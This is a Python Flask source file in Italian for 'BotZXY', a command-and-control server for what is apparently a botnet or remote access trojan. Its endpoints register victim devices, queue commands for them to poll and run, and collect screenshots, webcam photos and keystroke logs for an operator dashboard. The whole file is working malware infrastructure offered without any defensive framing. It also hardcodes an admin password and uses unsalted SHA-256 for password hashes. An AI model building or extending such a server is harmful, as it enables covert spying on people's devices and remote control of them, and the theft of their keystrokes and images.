from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_socketio import SocketIO
from flask_cors import CORS
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
import os
import hashlib
import time
import threading
from datetime import datetime
import werkzeug
from supabase import create_client, Client

# ============ CONFIGURAZIONE SUPABASE ============
SUPABASE_URL = os.environ.get('SUPABASE_URL')
SUPABASE_KEY = os.environ.get('SUPABASE_ANON_KEY')

if not SUPABASE_URL or not SUPABASE_KEY:
    print("⚠️ ATTENZIONE: SUPABASE_URL o SUPABASE_KEY non configurati!")
    print("I dati non saranno persistenti su Render!")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY) if SUPABASE_URL and SUPABASE_KEY else None

# ============ SICUREZZA LOGIN ============
LOGIN_ATTEMPTS = {}
MAX_ATTEMPTS = 5

# FIX per Werkzeug 2.2.3 con Flask-Login
if not hasattr(werkzeug.urls, 'url_decode'):
    werkzeug.urls.url_decode = lambda x, **kwargs: x

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'BotZXY_Secret_Key_2026_ULTRA_SECURE')
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# ============ SERVIRE FILE STATICI ============
@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory('static', filename)

# ============ MODELLO UTENTE ============
class User(UserMixin):
    def __init__(self, id, username, api_key):
        self.id = id
        self.username = username
        self.api_key = api_key

@login_manager.user_loader
def load_user(user_id):
    if not supabase:
        return None
    try:
        user = supabase.table('users').select('*').eq('id', user_id).execute()
        if user.data:
            u = user.data[0]
            return User(u['id'], u['username'], u['api_key'])
    except:
        pass
    return None

# ============ FUNZIONI DB ============
def get_user_by_username(username):
    if not supabase: return None
    try:
        result = supabase.table('users').select('*').eq('username', username).execute()
        return result.data[0] if result.data else None
    except:
        return None

def create_user(username, password_hash, api_key):
    if not supabase: return None
    try:
        result = supabase.table('users').insert({
            'username': username,
            'password_hash': password_hash,
            'api_key': api_key
        }).execute()
        return result.data[0] if result.data else None
    except:
        return None

def log_action(device_id, action, details):
    if not supabase: return
    try:
        supabase.table('logs').insert({
            'device_id': device_id or 'system',
            'action': action,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }).execute()
    except:
        pass

# ============ ROUTES PRINCIPALI ============
@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in LOGIN_ATTEMPTS:
            user_attempts = LOGIN_ATTEMPTS[username]
            if user_attempts.get('blocked_until') and time.time() < user_attempts['blocked_until']:
                remaining = int(user_attempts['blocked_until'] - time.time())
                minutes = remaining // 60
                seconds = remaining % 60
                error = f"🚫 Account bloccato. Riprova tra {minutes}m {seconds}s"
                return render_template('login.html', error=error)
            if user_attempts.get('blocked_until') and time.time() >= user_attempts['blocked_until']:
                user_attempts['count'] = 0
                user_attempts['blocked_until'] = None
        
        user = get_user_by_username(username)
        
        if user and hashlib.sha256(password.encode()).hexdigest() == user['password_hash']:
            if username in LOGIN_ATTEMPTS:
                LOGIN_ATTEMPTS[username]['count'] = 0
                LOGIN_ATTEMPTS[username]['blocked_until'] = None
            login_user(User(user['id'], user['username'], user['api_key']))
            log_action('system', 'login_success', f'Login effettuato da {username}')
            return render_template('dashboard.html')
        else:
            if username not in LOGIN_ATTEMPTS:
                LOGIN_ATTEMPTS[username] = {'count': 0, 'blocked_until': None}
            
            LOGIN_ATTEMPTS[username]['count'] += 1
            attempts_used = LOGIN_ATTEMPTS[username]['count']
            attempts_left = MAX_ATTEMPTS - attempts_used
            
            if attempts_used >= MAX_ATTEMPTS:
                block_level = (attempts_used - 1) // MAX_ATTEMPTS
                block_minutes = 2 * (2 ** block_level)
                block_seconds = block_minutes * 60
                LOGIN_ATTEMPTS[username]['blocked_until'] = time.time() + block_seconds
                error = f"🚫 Troppi tentativi falliti. Account bloccato per {block_minutes} minuti."
                log_action('system', 'login_blocked', f'Account {username} bloccato per {block_minutes}m')
                return render_template('login.html', error=error)
            else:
                error = f"❌ Credenziali errate. Tentativi rimasti: {attempts_left}"
                log_action('system', 'login_failed', f'Tentativo login fallito per {username}')
                return render_template('login.html', error=error)
    
    return render_template('login.html', error=error)

# ============ PAGINE ============
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/logout')
@login_required
def logout():
    log_action('system', 'logout', f'Logout di {current_user.username}')
    logout_user()
    return index()

@app.route('/logs')
@login_required
def logs_page():
    return render_template('logs.html')

@app.route('/settings')
@login_required
def settings_page():
    return render_template('settings.html')

@app.route('/devices')
@login_required
def devices_page():
    return render_template('devices.html')

@app.route('/captures')
@login_required
def captures_page():
    return render_template('captures.html')

@app.route('/analytics')
@login_required
def analytics_page():
    return render_template('analytics.html')

@app.route('/remote')
@login_required
def remote_page():
    return render_template('remote_control.html')

# ============ API DEVICES ============
@app.route('/api/devices', methods=['GET'])
@login_required
def get_devices():
    if not supabase:
        return jsonify([])
    try:
        result = supabase.table('devices').select('*').execute()
        return jsonify(result.data)
    except Exception as e:
        print(f"[-] Errore devices: {e}")
        return jsonify([])

@app.route('/api/device/<device_id>', methods=['DELETE'])
@login_required
def delete_device(device_id):
    if not supabase:
        return jsonify({'error': 'Database non configurato'}), 500
    try:
        supabase.table('commands').delete().eq('device_id', device_id).execute()
        supabase.table('captures').delete().eq('device_id', device_id).execute()
        supabase.table('devices').delete().eq('device_id', device_id).execute()
        log_action('system', 'device_deleted', f'Device {device_id} eliminato')
        return jsonify({'status': 'deleted'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============ API REGISTER ============
@app.route('/api/register', methods=['POST'])
def register_device():
    if not supabase:
        return jsonify({'error': 'Database non configurato'}), 500
    data = request.json
    device_id = data.get('device_id')
    platform = data.get('platform')
    hostname = data.get('hostname')
    ip = request.remote_addr
    os_version = data.get('os_version')
    
    try:
        existing = supabase.table('devices').select('*').eq('device_id', device_id).execute()
        if existing.data:
            supabase.table('devices').update({
                'last_seen': datetime.now().isoformat(),
                'is_online': True,
                'ip': ip
            }).eq('device_id', device_id).execute()
            log_action(device_id, 'device_updated', f'Device {hostname} reconnected')
            return jsonify({'status': 'updated'})
        else:
            supabase.table('devices').insert({
                'device_id': device_id,
                'platform': platform,
                'hostname': hostname,
                'ip': ip,
                'os_version': os_version,
                'last_seen': datetime.now().isoformat(),
                'is_online': True,
                'bot_name': 'BotZXY'
            }).execute()
            log_action(device_id, 'device_registered', f'Nuovo device {hostname} ({platform}) registrato')
            return jsonify({'status': 'registered', 'device_id': device_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============ API COMANDI ============
@app.route('/api/command/<device_id>', methods=['POST'])
@login_required
def send_command(device_id):
    if not supabase:
        return jsonify({'error': 'Database non configurato'}), 500
    data = request.json
    command = data.get('command')
    params = data.get('params', '')
    try:
        supabase.table('commands').insert({
            'device_id': device_id,
            'command': command,
            'params': params,
            'status': 'pending',
            'created_at': datetime.now().isoformat()
        }).execute()
        log_action(device_id, 'command_sent', f'Comando: {command} {params}')
        return jsonify({'status': 'command_queued'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/poll/<device_id>', methods=['GET'])
def poll_commands(device_id):
    if not supabase:
        return jsonify([])
    try:
        supabase.table('devices').update({
            'last_seen': datetime.now().isoformat(),
            'is_online': True
        }).eq('device_id', device_id).execute()
        
        result = supabase.table('commands').select('*').eq('device_id', device_id).eq('status', 'pending').execute()
        return jsonify(result.data)
    except:
        return jsonify([])

@app.route('/api/result/<device_id>', methods=['POST'])
def command_result(device_id):
    if not supabase:
        return jsonify({'error': 'Database non configurato'}), 500
    data = request.json
    command_id = data.get('command_id')
    result = data.get('result')
    status = data.get('status', 'executed')
    try:
        supabase.table('commands').update({
            'status': status,
            'result': result,
            'executed_at': datetime.now().isoformat()
        }).eq('id', command_id).execute()
        log_action(device_id, 'command_result', f'Comando {command_id} eseguito: {status}')
        return jsonify({'status': 'recorded'})
    except:
        return jsonify({'error': 'Errore'}), 500

# ============ API CATTURE ============
@app.route('/api/captures', methods=['GET'])
@login_required
def get_captures():
    if not supabase:
        return jsonify([])
    try:
        limit = request.args.get('limit', 50, type=int)
        result = supabase.table('captures').select('*').order('created_at', desc=True).limit(limit).execute()
        return jsonify(result.data)
    except:
        return jsonify([])

@app.route('/api/screenshot/<device_id>', methods=['POST'])
def upload_screenshot(device_id):
    if not supabase:
        return jsonify({'error': 'Database non configurato'}), 500
    data = request.json
    try:
        supabase.table('captures').insert({
            'device_id': device_id,
            'type': 'screenshot',
            'data': data.get('image_base64'),
            'created_at': datetime.now().isoformat()
        }).execute()
        log_action(device_id, 'screenshot_captured', 'Screenshot catturato')
        return jsonify({'status': 'saved'})
    except:
        return jsonify({'error': 'Errore'}), 500

@app.route('/api/webcam/<device_id>', methods=['POST'])
def upload_webcam(device_id):
    if not supabase:
        return jsonify({'error': 'Database non configurato'}), 500
    data = request.json
    try:
        supabase.table('captures').insert({
            'device_id': device_id,
            'type': 'webcam',
            'data': data.get('image_base64'),
            'created_at': datetime.now().isoformat()
        }).execute()
        log_action(device_id, 'webcam_captured', 'Foto webcam catturata')
        return jsonify({'status': 'saved'})
    except:
        return jsonify({'error': 'Errore'}), 500

@app.route('/api/keylog/<device_id>', methods(['POST'])
def upload_keylog(device_id):
    if not supabase:
        return jsonify({'error': 'Database non configurato'}), 500
    data = request.json
    try:
        supabase.table('captures').insert({
            'device_id': device_id,
            'type': 'keylog',
            'data': data.get('keys'),
            'created_at': datetime.now().isoformat()
        }).execute()
        log_action(device_id, 'keylog_captured', 'Keylog catturato')
        return jsonify({'status': 'saved'})
    except:
        return jsonify({'error': 'Errore'}), 500

# ============ API STATS ============
@app.route('/api/stats', methods=['GET'])
@login_required
def get_stats():
    if not supabase:
        return jsonify({'total_devices': 0, 'online_devices': 0, 'total_captures': 0, 'total_commands': 0})
    try:
        devices = supabase.table('devices').select('*').execute()
        captures = supabase.table('captures').select('*').execute()
        commands = supabase.table('commands').select('*').execute()
        
        total = len(devices.data) if devices.data else 0
        online = sum(1 for d in (devices.data or []) if d.get('is_online', False))
        
        return jsonify({
            'total_devices': total,
            'online_devices': online,
            'total_captures': len(captures.data) if captures.data else 0,
            'total_commands': len(commands.data) if commands.data else 0
        })
    except:
        return jsonify({'total_devices': 0, 'online_devices': 0, 'total_captures': 0, 'total_commands': 0})

@app.route('/api/chart/activity', methods=['GET'])
@login_required
def get_activity_chart():
    if not supabase:
        return jsonify({'labels': [], 'data': []})
    try:
        hours = [f"{str(i).zfill(2)}:00" for i in range(24)]
        return jsonify({
            'labels': hours,
            'data': [0] * 24
        })
    except:
        return jsonify({'labels': [], 'data': []})

# ============ IMPOSTAZIONI ============
@app.route('/api/settings', methods=['GET'])
@login_required
def get_settings():
    if not supabase:
        return jsonify({'theme': 'dark', 'language': 'it', 'notifications': 'on'})
    try:
        result = supabase.table('users').select('theme, language, notifications').eq('id', current_user.id).execute()
        if result.data:
            return jsonify({
                'theme': result.data[0].get('theme', 'dark'),
                'language': result.data[0].get('language', 'it'),
                'notifications': result.data[0].get('notifications', 'on')
            })
        return jsonify({'theme': 'dark', 'language': 'it', 'notifications': 'on'})
    except:
        return jsonify({'theme': 'dark', 'language': 'it', 'notifications': 'on'})

@app.route('/api/settings', methods=['POST'])
@login_required
def save_settings():
    if not supabase:
        return jsonify({'status': 'saved'})
    data = request.json
    theme = data.get('theme', 'dark')
    language = data.get('language', 'it')
    notifications = data.get('notifications', 'on')
    try:
        supabase.table('users').update({
            'theme': theme,
            'language': language,
            'notifications': notifications
        }).eq('id', current_user.id).execute()
        log_action('system', 'settings_updated', f'Impostazioni: theme={theme}, language={language}')
        return jsonify({'status': 'saved'})
    except:
        return jsonify({'error': 'Errore salvataggio'}), 500

# ============ TRADUZIONI ============
@app.route('/api/translations', methods=['GET'])
def get_translations():
    """Traduzioni per l'interfaccia - SENZA login_required per funzionare sulla pagina di login"""
    lang = request.args.get('lang', 'it')
    translations = {
        'it': {
            'dashboard': 'Dashboard', 'devices': 'Dispositivi', 'captures': 'Catture',
            'analytics': 'Analytics', 'logs': 'Log', 'settings': 'Impostazioni',
            'logout': 'Esci', 'total_devices': 'Dispositivi totali', 'online_bots': 'Bot online',
            'commands': 'Comandi', 'system_active': 'Sistema attivo', 'refresh': 'Aggiorna',
            'export': 'Esporta', 'delete': 'Elimina', 'save': 'Salva', 'cancel': 'Annulla',
            'search': 'Cerca...', 'no_data': 'Nessun dato disponibile', 'loading': 'Caricamento...',
            'error': 'Errore', 'success': 'Successo', 'online': 'Online', 'offline': 'Offline',
            'actions': 'Azioni', 'platform': 'Piattaforma', 'hostname': 'Nome host',
            'ip': 'Indirizzo IP', 'status': 'Stato', 'last_seen': 'Ultimo visto',
            'phone': 'Telefono', 'id': 'ID', 'type': 'Tipo', 'created_at': 'Creato il',
            'details': 'Dettagli', 'timestamp': 'Data/ora', 'device': 'Dispositivo',
            'action': 'Azione', 'no_devices': 'Nessun dispositivo connesso',
            'no_captures': 'Nessuna cattura trovata', 'no_logs': 'Nessun log disponibile',
            'theme': 'Tema', 'language': 'Lingua', 'notifications': 'Notifiche',
            'security': 'Sicurezza', 'change_password': 'Cambia password',
            'logout_all': 'Disconnetti tutti i dispositivi', 'save_settings': 'Salva impostazioni',
            'settings_saved': 'Impostazioni salvate!', 'settings_error': 'Errore salvataggio',
            'password_changed': 'Password cambiata con successo!', 'password_error': 'Password attuale errata',
            'capture_types': 'Tipi di cattura', 'top_devices': 'Dispositivi più attivi',
            'activity_7d': 'Attività dispositivi (7 giorni)', 'platforms': 'Piattaforme',
            'stats': 'Statistiche reali', 'active_bots': 'Bot attivi (oggi)',
            'username': 'Username', 'password': 'Password', 'login_btn': 'ACCEDI AL DASHBOARD',
            'dark': 'Scuro', 'light': 'Chiaro', 'blue': 'Blu', 'green': 'Verde',
            'purple': 'Viola', 'orange': 'Arancione', 'cyber': 'Cyber', 'matrix': 'Matrix',
            'lang_it': 'Italiano', 'lang_en': 'English', 'lang_fr': 'Français',
            'lang_es': 'Español', 'lang_de': 'Deutsch', 'remote': 'Controllo Remoto',
            'username_label': 'Username', 'password_label': 'Password',
            'login_btn_label': 'ACCEDI AL DASHBOARD', 'loading_label': 'Accesso in corso...'
        },
        'en': {
            'dashboard': 'Dashboard', 'devices': 'Devices', 'captures': 'Captures',
            'analytics': 'Analytics', 'logs': 'Logs', 'settings': 'Settings',
            'logout': 'Logout', 'total_devices': 'Total Devices', 'online_bots': 'Online Bots',
            'commands': 'Commands', 'system_active': 'System Active', 'refresh': 'Refresh',
            'export': 'Export', 'delete': 'Delete', 'save': 'Save', 'cancel': 'Cancel',
            'search': 'Search...', 'no_data': 'No data available', 'loading': 'Loading...',
            'error': 'Error', 'success': 'Success', 'online': 'Online', 'offline': 'Offline',
            'actions': 'Actions', 'platform': 'Platform', 'hostname': 'Hostname',
            'ip': 'IP Address', 'status': 'Status', 'last_seen': 'Last Seen',
            'phone': 'Phone', 'id': 'ID', 'type': 'Type', 'created_at': 'Created At',
            'details': 'Details', 'timestamp': 'Date/Time', 'device': 'Device',
            'action': 'Action', 'no_devices': 'No devices connected',
            'no_captures': 'No captures found', 'no_logs': 'No logs available',
            'theme': 'Theme', 'language': 'Language', 'notifications': 'Notifications',
            'security': 'Security', 'change_password': 'Change Password',
            'logout_all': 'Logout all devices', 'save_settings': 'Save Settings',
            'settings_saved': 'Settings saved!', 'settings_error': 'Error saving',
            'password_changed': 'Password changed successfully!', 'password_error': 'Current password is incorrect',
            'capture_types': 'Capture types', 'top_devices': 'Top devices',
            'activity_7d': 'Device activity (7 days)', 'platforms': 'Platforms',
            'stats': 'Real statistics', 'active_bots': 'Active bots (today)',
            'username': 'Username', 'password': 'Password', 'login_btn': 'ACCESS DASHBOARD',
            'dark': 'Dark', 'light': 'Light', 'blue': 'Blue', 'green': 'Green',
            'purple': 'Purple', 'orange': 'Orange', 'cyber': 'Cyber', 'matrix': 'Matrix',
            'lang_it': 'Italian', 'lang_en': 'English', 'lang_fr': 'French',
            'lang_es': 'Spanish', 'lang_de': 'German', 'remote': 'Remote Control',
            'username_label': 'Username', 'password_label': 'Password',
            'login_btn_label': 'ACCESS DASHBOARD', 'loading_label': 'Logging in...'
        }
    }
    return jsonify(translations.get(lang, translations['it']))

# ============ LOGS ============
@app.route('/api/logs', methods=['GET'])
@login_required
def get_logs():
    if not supabase:
        return jsonify([])
    try:
        limit = request.args.get('limit', 100, type=int)
        result = supabase.table('logs').select('*').order('timestamp', desc=True).limit(limit).execute()
        return jsonify(result.data)
    except:
        return jsonify([])

@app.route('/api/logs/clear', methods=['POST'])
@login_required
def clear_logs():
    if not supabase:
        return jsonify({'error': 'Database non configurato'}), 500
    try:
        supabase.table('logs').delete().neq('id', 0).execute()
        log_action('system', 'logs_cleared', 'Log cancellati da admin')
        return jsonify({'status': 'cleared'})
    except:
        return jsonify({'error': 'Errore'}), 500

# ============ SICUREZZA ============
@app.route('/api/change_password', methods=['POST'])
@login_required
def change_password():
    if not supabase:
        return jsonify({'error': 'Database non configurato'}), 500
    data = request.json
    old_password = data.get('old_password')
    new_password = data.get('new_password')
    
    try:
        user = supabase.table('users').select('*').eq('id', current_user.id).execute()
        if not user.data:
            return jsonify({'error': 'Utente non trovato'}), 404
        
        if hashlib.sha256(old_password.encode()).hexdigest() != user.data[0]['password_hash']:
            return jsonify({'error': 'Password attuale errata'}), 401
        
        supabase.table('users').update({
            'password_hash': hashlib.sha256(new_password.encode()).hexdigest()
        }).eq('id', current_user.id).execute()
        
        log_action('system', 'password_changed', f'Password cambiata da {current_user.username}')
        return jsonify({'status': 'password_updated'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============ ADMIN SETUP ============
def setup_admin_user():
    if not supabase:
        print("⚠️ Supabase non configurato, admin non creato!")
        return
    try:
        existing = supabase.table('users').select('*').eq('username', 'BotZXY-Admin').execute()
        if not existing.data:
            api_key = hashlib.sha256(os.urandom(32)).hexdigest()
            password_hash = hashlib.sha256('35£t}nSBzoA%M#4T\e<'.encode()).hexdigest()
            supabase.table('users').insert({
                'username': 'BotZXY-Admin',
                'password_hash': password_hash,
                'api_key': api_key
            }).execute()
            print('[+] Admin creato: BotZXY-Admin / 35£t}nSBzoA%M#4T\e<')
    except Exception as e:
        print(f"[-] Admin creation error: {e}")

# ============ MAIN ============
if __name__ == '__main__':
    setup_admin_user()
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, debug=False)